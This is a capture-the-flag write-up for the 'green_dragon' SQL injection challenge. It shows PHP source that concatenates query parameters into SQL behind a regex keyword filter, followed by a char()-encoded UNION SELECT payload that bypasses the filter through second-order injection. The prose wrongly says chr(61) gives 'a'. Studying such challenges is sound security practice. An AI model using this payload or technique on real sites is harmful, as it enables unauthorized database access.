# green_dragon

```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']){
    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    $result = mysqli_fetch_array(mysqli_query($db,$query2));
    if($result['id'] == "admin") solve("green_dragon");
  }
  highlight_file(__FILE__);
?>

```

Here we have to select admin's credentials. But when we use `' or 1` we are not getting the credentials. So we suspect the table is empty. so we have to make it return id admin. We can use `union select 'admin'` but `'` are blocked. So we have to use `chr(61)` to get `a` and so on. We also have to select it two times so we created the payload
`union select char(92),char(117,110,105,111,110,32,115,101,108,101,99,116,32,99,104,97,114,40,57,55,44,49,48,48,44,49,48,57,44,49,48,53,44,49,49,48,41,35); --+-`
